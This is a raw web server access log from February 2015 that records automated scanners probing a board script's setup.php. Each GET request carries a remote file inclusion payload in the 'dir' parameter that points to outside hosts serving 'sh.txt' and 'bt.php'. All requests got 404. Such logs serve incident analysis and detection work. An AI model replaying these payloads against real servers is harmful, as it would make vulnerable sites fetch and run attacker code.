80.68.145.110 - - [14/Feb/2015:16:34:51 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [14/Feb/2015:16:34:51 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [14/Feb/2015:16:34:53 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
80.68.145.110 - - [14/Feb/2015:16:35:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [14/Feb/2015:16:35:02 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [14/Feb/2015:16:35:02 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
80.68.145.110 - - [14/Feb/2015:16:35:04 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
203.58.0.155 - - [14/Feb/2015:16:35:24 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [14/Feb/2015:16:35:25 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [14/Feb/2015:16:35:26 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [14/Feb/2015:16:35:27 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
80.68.145.110 - - [14/Feb/2015:16:37:04 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:05 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:06 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:07 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:10 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:11 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
80.68.145.110 - - [14/Feb/2015:16:37:13 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
91.121.6.123 - - [14/Feb/2015:16:37:37 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:38 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:39 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:40 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [14/Feb/2015:16:37:57 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
71.6.150.241 - - [14/Feb/2015:16:38:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [14/Feb/2015:16:38:57 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [14/Feb/2015:16:38:57 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
71.6.150.241 - - [14/Feb/2015:16:38:58 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
180.179.212.185 - - [14/Feb/2015:16:40:44 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [14/Feb/2015:16:40:46 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [14/Feb/2015:16:40:46 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
180.179.212.185 - - [14/Feb/2015:16:40:48 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
203.58.0.155 - - [14/Feb/2015:16:42:23 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:42:25 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:42:25 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:42:27 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:44:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:44:22 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:44:22 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [14/Feb/2015:16:44:24 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.175.50.226 - - [14/Feb/2015:16:49:42 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
112.175.50.226 - - [14/Feb/2015:16:49:43 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
112.175.50.226 - - [14/Feb/2015:16:49:44 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
112.175.50.226 - - [14/Feb/2015:16:49:45 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
176.31.252.38 - - [14/Feb/2015:17:04:10 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:12 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:12 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:13 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:13 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:15 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:15 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [14/Feb/2015:17:04:16 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
1.224.163.80 - - [14/Feb/2015:17:04:20 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:20 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:21 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:22 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:22 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:22 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:23 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:24 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:31 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:32 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:33 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:33 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
174.136.14.201 - - [14/Feb/2015:17:04:33 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:33 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:34 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:17:04:34 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:34 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:35 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
174.136.14.201 - - [14/Feb/2015:17:04:35 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:35 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:35 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:17:04:36 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
174.136.14.201 - - [14/Feb/2015:17:04:36 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:37 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:17:04:38 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:17:04:39 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:17:04:40 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:17:04:40 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:17:04:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
174.136.14.201 - - [14/Feb/2015:17:04:41 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:17:04:41 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
1.224.163.80 - - [14/Feb/2015:17:04:41 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
174.136.14.201 - - [14/Feb/2015:17:04:42 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:42 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:17:04:43 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
174.136.14.201 - - [14/Feb/2015:17:04:43 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://koreahr.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:43 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:44 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://koreahr.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:44 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
174.136.14.201 - - [14/Feb/2015:17:04:46 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511" 
1.224.163.80 - - [14/Feb/2015:17:04:46 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:47 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:48 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:48 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:49 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:50 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [14/Feb/2015:17:04:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [14/Feb/2015:17:04:55 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [14/Feb/2015:17:04:55 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
1.224.163.80 - - [14/Feb/2015:17:04:56 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [14/Feb/2015:17:04:56 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [14/Feb/2015:17:04:57 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [14/Feb/2015:17:04:57 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [14/Feb/2015:17:04:57 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
